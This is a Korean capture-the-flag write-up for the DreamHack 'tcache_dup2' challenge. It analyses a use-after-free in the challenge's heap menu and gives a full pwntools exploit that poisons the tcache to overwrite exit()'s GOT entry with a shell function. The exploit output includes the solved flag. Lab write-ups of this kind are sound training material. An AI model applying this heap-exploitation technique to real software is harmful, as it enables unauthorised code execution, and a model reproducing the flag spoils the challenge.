# [DreamHack] tcache_dup2

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(tcache_dup2)의 바이너리와 소스 코드가 주어집니다.
> 취약점을 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [tcache_dup2.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549367/tcache_dup2.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160310290-1880f246-2c14-4c55-88a8-60d518e42163.png)

## Analysis

### create_heap()

```c
	if( idx >= 7 ) 
		exit(0);
```

`create_heap()`에 인자로 전달되는 `idx`는 `ptr`에 할당된 청크의 개수를 의미한다. 이 값은 청크가 free되어도 줄어들지 않기 때문에, 최대 7번까지만 청크를 할당할 수 있다.

```c
	printf("Size: ");
	scanf("%ld", &size);

	ptr[idx] = malloc(size);

	if(!ptr[idx])
		exit(0);
```

사이즈를 입력받고 그 사이즈만큼 `malloc()`으로 청크를 할당해서 `ptr[idx]`에 저장한다. 정상적으로 할당되지 않으면 프로세스를 종료한다.

```c
	printf("Data: ");
	read(0, ptr[idx], size-1);
```

청크에 데이터를 입력받는다.

### modify_heap()

```c
	printf("idx: ");
	scanf("%ld", &idx);

	if( idx >= 7 ) 
		exit(0);
```

수정할 청크의 index를 입력받는다. 7 이상을 입력하면 프로세스를 종료한다.

```c
	printf("Size: ");
	scanf("%ld", &size);

	if( size > 0x10 ) 
		exit(0);
```

수정할 데이터의 크기를 입력받는데, `0x10`보다 크면 프로세스를 종료한다. 즉 청크 데이터의 앞쪽 `0x10`바이트만 수정할 수 있다.

```c
	printf("Data: ");
	read(0, ptr[idx], size);
```

`size`만큼 청크의 데이터를 수정한다.

### delete_heap()

```c
	printf("idx: ");
	scanf("%ld", &idx);
	if( idx >= 7 ) 
		exit(0);

	if( !ptr[idx] ) 
		exit(0);
```

해제할 청크의 index를 입력받는다. 7 이상의 index를 입력하거나, `ptr[idx]`에 청크가 없으면 프로세스를 종료한다.

```c
	free(ptr[idx]);
```

`ptr[idx]`에 저장된 청크를 해제한다. 이때 `ptr`에 있는 청크의 주소를 초기화하지 않아서 UAF가 발생한다.

## Exploit

Partial RELRO 환경이므로 GOT overwrite가 가능하다. UAF를 이용하여 GOT에 fake chunk를 할당받고, GOT를 `get_shell()`의 주소로 덮으면 그 함수가 호출될 때 셸을 획득할 수 있다.

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/tcache_dup2')
else:
    r = remote('host1.dreamhack.games', 10905)

sla = r.sendlineafter
sa = r.sendafter


def Create(size, data):
    sla('> ', '1')
    sla('Size: ', str(size))
    sla('Data: ', data)


def Modify(idx, size, data):
    sla('> ', '2')
    sla('idx: ', str(idx))
    sla('Size: ', str(size))
    sla('Data: ', data)


def Delete(idx):
    sla('> ', '3')
    sla('idx: ', str(idx))


exit_got = 0x404060  # GOT of exit()
get_shell = 0x401530  # get_shell()


Create(0x18, 'a')  # idx: 0
Create(0x18, 'a')  # idx: 1
Delete(0)
Delete(1)

Modify(1, 8, p64(exit_got))
Create(0x18, 'a')  # idx: 2
Create(0x18, p64(get_shell))  # overwrite GOT of exit() with get_shell()

sla('> ', '3')
sla('idx: ', '7')  # call exit()


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 10905: Done
[*] Switching to interactive mode
$ cat flag
DH{308cdf00db6cd93fddf9f27801bba7c9}
```